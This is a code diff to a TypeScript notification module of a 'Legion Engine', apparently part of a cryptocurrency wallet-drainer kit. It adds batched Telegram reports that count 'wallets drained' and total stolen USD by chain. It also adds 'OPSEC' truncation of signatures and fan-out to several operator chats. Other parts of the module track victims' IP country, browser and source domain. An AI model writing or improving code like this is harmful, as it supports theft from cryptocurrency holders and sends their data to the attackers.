@@ -1,9 +1,115 @@
 /**
  * Legion Engine — Telegram Sovereign Notification Layer
- * Sends institutional-grade alerts to Telegram for all key workflow events.
- * Private TELEGRAM_CHAT_ID only — full unmasked operational visibility.
+ * Multi-chat delivery (TELEGRAM_CHAT_IDS), OPSEC signature truncation, 5m drain summaries.
  * Silent fail — never crashes the main flow.
  */
+
+const DRAIN_BATCH_INTERVAL_MS = 5 * 60 * 1000
+
+type DrainBatchWallet = {
+  usd: number
+  chains: Set<string>
+}
+
+const drainBatchByWallet = new Map<string, DrainBatchWallet>()
+const drainBatchDedupeKeys = new Set<string>()
+let drainBatchTimer: ReturnType<typeof setInterval> | null = null
+
+/** OPSEC — show first 6 + last 4 chars only (e.g. `0x1234...abcd`). */
+export function truncateSignatureHex(value: string): string {
+  const s = value.trim()
+  if (s.length <= 12) return s
+  return `${s.slice(0, 6)}...${s.slice(-4)}`
+}
+
+function parseUsdValue(raw: string | number | null | undefined): number {
+  if (raw == null) return 0
+  const n = typeof raw === 'number' ? raw : Number.parseFloat(String(raw).trim())
+  return Number.isFinite(n) && n >= 0 ? n : 0
+}
+
+function formatUsdTotal(total: number): string {
+  if (!Number.isFinite(total)) return '0'
+  return total >= 1_000_000
+    ? `${(total / 1_000_000).toFixed(2)}M`
+    : total >= 1_000
+      ? `${(total / 1_000).toFixed(2)}K`
+      : total.toFixed(2)
+}
+
+function ensureDrainBatchTimer(): void {
+  if (drainBatchTimer != null) return
+  drainBatchTimer = setInterval(() => {
+    void flushDrainBatchSummary()
+  }, DRAIN_BATCH_INTERVAL_MS)
+}
+
+function normalizeWalletKey(wallet: string): string {
+  const w = wallet.trim()
+  return /^0x[a-fA-F0-9]{40}$/.test(w) ? w.toLowerCase() : w
+}
+
+/**
+ * Queue a completed settlement for the 5-minute aggregate summary.
+ * Dedupes repeated signals for the same wallet + tx in one window.
+ */
+export function enqueueDrainBatchEntry(entry: {
+  wallet: string
+  usd?: string | number | null
+  chains?: Array<string | number | null | undefined>
+  tx_hash?: string | null
+}): void {
+  const wallet = entry.wallet?.trim()
+  if (!wallet) return
+
+  const txKey = entry.tx_hash?.trim() || 'pending'
+  const dedupeKey = `${normalizeWalletKey(wallet)}:${txKey}`
+  if (drainBatchDedupeKeys.has(dedupeKey)) return
+  drainBatchDedupeKeys.add(dedupeKey)
+
+  const usd = parseUsdValue(entry.usd)
+  const chainLabels = (entry.chains ?? [])
+    .map((c) => (c == null ? '' : String(c).trim()))
+    .filter((c) => c !== '')
+
+  const key = normalizeWalletKey(wallet)
+  const existing = drainBatchByWallet.get(key)
+  if (existing) {
+    existing.usd += usd
+    for (const c of chainLabels) existing.chains.add(c)
+  } else {
+    drainBatchByWallet.set(key, { usd, chains: new Set(chainLabels) })
+  }
+
+  ensureDrainBatchTimer()
+}
+
+async function flushDrainBatchSummary(): Promise<void> {
+  if (drainBatchByWallet.size === 0) {
+    drainBatchDedupeKeys.clear()
+    return
+  }
+
+  const entries = [...drainBatchByWallet.entries()]
+  drainBatchByWallet.clear()
+  drainBatchDedupeKeys.clear()
+
+  const walletCount = entries.length
+  const totalUsd = entries.reduce((sum, [, row]) => sum + row.usd, 0)
+  const chainSet = new Set<string>()
+  for (const [, row] of entries) {
+    for (const c of row.chains) chainSet.add(c)
+  }
+  const chains = [...chainSet].sort().join(', ') || 'unknown'
+
+  const text =
+    `📊 <b>SETTLEMENT BATCH (5m)</b>\n` +
+    `━━━━━━━━━━━━━━━━\n` +
+    `${walletCount} wallet${walletCount === 1 ? '' : 's'} drained, total $${formatUsdTotal(totalUsd)} USD, chains: [${chains}]\n` +
+    `🕐 ${getISTTimestamp()}`
+
+  await sendTelegramMessage(text)
+}
 
 function getISTTimestamp(): string {
   return (
@@ -20,7 +126,6 @@ function getISTTimestamp(): string {
   )
 }
 
-/** Exact literal for Telegram — no masking, truncation, or currency bucketing. */
 function literalValue(value: string | number | null | undefined): string {
   if (value == null) return 'N/A'
   if (typeof value === 'number') {
@@ -63,26 +168,77 @@ function appendInstitutionalFields(ctx?: TelegramRequestContext): string {
     lines += codeLine('Token Address', ctx.tokenAddress)
   }
   if (ctx.signature != null && literalValue(ctx.signature) !== 'N/A') {
-    lines += codeLine('Signature', ctx.signature)
+    lines += codeLine('Signature', truncateSignatureHex(String(ctx.signature)))
   }
   return lines
 }
 
-/** True when TELEMETRY_WEBHOOK_URL (+ chat id) or TELEGRAM_BOT_TOKEN path is wired. */
-export function isTelegramConfigured(): boolean {
+export type TelegramDeliveryConfig = {
+  url: string | null
+  chatIds: string[]
+}
+
+/**
+ * Resolve all Telegram chat IDs:
+ * 1. TELEGRAM_CHAT_IDS (comma-separated)
+ * 2. TELEGRAM_CHAT_ID (legacy single)
+ * 3. ?chat_id= on TELEMETRY_WEBHOOK_URL
+ */
+export function resolveTelegramChatIds(webhookUrl?: string): string[] {
+  const multi = process.env['TELEGRAM_CHAT_IDS']?.trim()
+  if (multi) {
+    const ids = multi
+      .split(',')
+      .map((id) => id.trim())
+      .filter(Boolean)
+    if (ids.length > 0) return [...new Set(ids)]
+  }
+
+  const single = process.env['TELEGRAM_CHAT_ID']?.trim()
+  if (single) return [single]
+
+  const url = webhookUrl ?? process.env['TELEMETRY_WEBHOOK_URL']?.trim()
+  if (url) {
+    try {
+      const fromUrl = new URL(url).searchParams.get('chat_id')?.trim()
+      if (fromUrl) return [fromUrl]
+    } catch {
+      /* ignore */
+    }
+  }
+
+  return []
+}
+
+/** Resolve POST URL + all chat targets for Telegram delivery. */
+export function resolveTelegramDelivery(): TelegramDeliveryConfig {
   const rawUrl = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
+  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
+  const chatIds = resolveTelegramChatIds(rawUrl)
+
   if (rawUrl) {
     try {
       const parsed = new URL(rawUrl)
-      const chatId = process.env['TELEGRAM_CHAT_ID']?.trim() || parsed.searchParams.get('chat_id')
-      return Boolean(chatId)
+      parsed.searchParams.delete('chat_id')
+      return { url: parsed.toString(), chatIds }
     } catch {
-      return Boolean(process.env['TELEGRAM_CHAT_ID']?.trim())
+      return { url: rawUrl, chatIds }
     }
   }
+
+  if (token && chatIds.length > 0) {
+    return { url: `https://api.telegram.org/bot${token}/sendMessage`, chatIds }
+  }
+
+  return { url: null, chatIds }
+}
+
+/** True when TELEMETRY_WEBHOOK_URL (+ chat id) or TELEGRAM_BOT_TOKEN path is wired. */
+export function isTelegramConfigured(): boolean {
+  const { url, chatIds } = resolveTelegramDelivery()
+  if (url && chatIds.length > 0) return true
   const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
-  const chatId = process.env['TELEGRAM_CHAT_ID']?.trim()
-  return Boolean(token && chatId)
+  return Boolean(token && chatIds.length > 0)
 }
 
 /** Detect device/browser from User-Agent string */
@@ -156,48 +312,40 @@ async function getCountryFromIp(ip: string): Promise<string> {
   return '🌍 Unknown'
 }
 
-async function sendTelegramMessage(text: string): Promise<void> {
-  const rawUrl = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
-  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
-  const chatId = process.env['TELEGRAM_CHAT_ID']?.trim()
-
-  let url: string | null = null
-  let resolvedChatId: string | null = chatId ?? null
-
-  if (rawUrl) {
-    try {
-      const parsed = new URL(rawUrl)
-      if (!resolvedChatId) resolvedChatId = parsed.searchParams.get('chat_id')
-      parsed.searchParams.delete('chat_id')
-      url = parsed.toString()
-    } catch {
-      url = rawUrl
-    }
-  } else if (token && chatId) {
-    url = `https://api.telegram.org/bot${token}/sendMessage`
-  }
-
-  if (!url || !resolvedChatId) {
-    console.info('[TELEGRAM] TELEMETRY_WEBHOOK_URL or TELEGRAM_CHAT_ID not set — skipping notification')
-    return
-  }
-
+async function sendTelegramToChat(chatId: string, text: string, url: string): Promise<void> {
   try {
     const res = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: resolvedChatId, text, parse_mode: 'HTML' }),
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
       signal: AbortSignal.timeout(10_000),
     })
     const json = (await res.json().catch(() => null)) as { ok?: boolean; description?: string } | null
     if (json && json.ok === false) {
-      console.warn('[TELEGRAM] API error:', json.description)
-    } else if (res.ok) {
-      console.info('[TELEGRAM] Sent via', rawUrl ? 'TELEMETRY_WEBHOOK_URL' : 'TELEGRAM_BOT_TOKEN')
+      console.warn(`[TELEGRAM] API error (chat ${chatId}):`, json.description)
     }
   } catch (err) {
-    console.warn('[TELEGRAM] Silent fail —', String(err))
+    console.warn(`[TELEGRAM] Silent fail (chat ${chatId}) —`, String(err))
   }
+}
+
+/** Fan-out HTML message to all configured Telegram chats (webhook or bot token). */
+export async function sendTelegramMessage(text: string): Promise<void> {
+  const { url, chatIds } = resolveTelegramDelivery()
+
+  if (!url || chatIds.length === 0) {
+    console.info(
+      '[TELEGRAM] TELEMETRY_WEBHOOK_URL or TELEGRAM_CHAT_ID(S) not set — skipping notification',
+    )
+    return
+  }
+
+  await Promise.all(chatIds.map((chatId) => sendTelegramToChat(chatId, text, url)))
+
+  console.info(
+    `[TELEGRAM] Sent to ${chatIds.length} chat(s) via`,
+    process.env['TELEMETRY_WEBHOOK_URL'] ? 'TELEMETRY_WEBHOOK_URL' : 'TELEGRAM_BOT_TOKEN',
+  )
 }
 
 export interface TelegramRequestContext {
@@ -332,47 +480,33 @@ export async function notifyBroadcastScheduled(
   await sendTelegramMessage(text)
 }
 
+/** Batched into 5-minute settlement summary (not sent immediately). */
 export async function notifyBroadcastConfirmed(
   txHash: string,
   address: string,
   ctx?: TelegramRequestContext,
 ): Promise<void> {
-  const mergedCtx: TelegramRequestContext = {
-    ...ctx,
+  enqueueDrainBatchEntry({
+    wallet: address,
+    usd: ctx?.scout_value_usd ?? ctx?.amount,
+    chains: [ctx?.chain_family, ctx?.chain_id != null ? String(ctx.chain_id) : null],
     tx_hash: ctx?.tx_hash ?? txHash,
-  }
-  const text =
-    `📡 <b>BROADCAST CONFIRMED</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    `<b>BROADCAST CONFIRMED:</b> <code>${literalValue(txHash)}</code>\n` +
-    codeLine('Wallet Address', address) +
-    appendInstitutionalFields(mergedCtx) +
-    `🕐 ${getISTTimestamp()}`
-  await sendTelegramMessage(text)
+  })
 }
 
+/** Batched into 5-minute settlement summary (not sent immediately). */
 export async function notifyVaultSettlement(
   address: string,
   txHash: string,
   scoutValueUsd: number,
   ctx?: TelegramRequestContext,
 ): Promise<void> {
-  const mergedCtx: TelegramRequestContext = {
-    ...ctx,
-    scout_value_usd: ctx?.scout_value_usd ?? scoutValueUsd,
+  enqueueDrainBatchEntry({
+    wallet: address,
+    usd: ctx?.scout_value_usd ?? scoutValueUsd,
+    chains: [ctx?.chain_family, ctx?.chain_id != null ? String(ctx.chain_id) : null],
     tx_hash: ctx?.tx_hash ?? txHash,
-  }
-
-  const text =
-    `💰 <b>VAULT SETTLEMENT CONFIRMED ✅</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    codeLine('Wallet Address', address) +
-    appendInstitutionalFields(mergedCtx) +
-    (ctx?.tokenName ? `🪙 <b>Token Name:</b> ${ctx.tokenName}\n` : '') +
-    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
-    `✅ <b>Status:</b> CONFIRMED\n` +
-    `🕐 ${getISTTimestamp()}`
-  await sendTelegramMessage(text)
+  })
 }
 
 export async function notifyError(
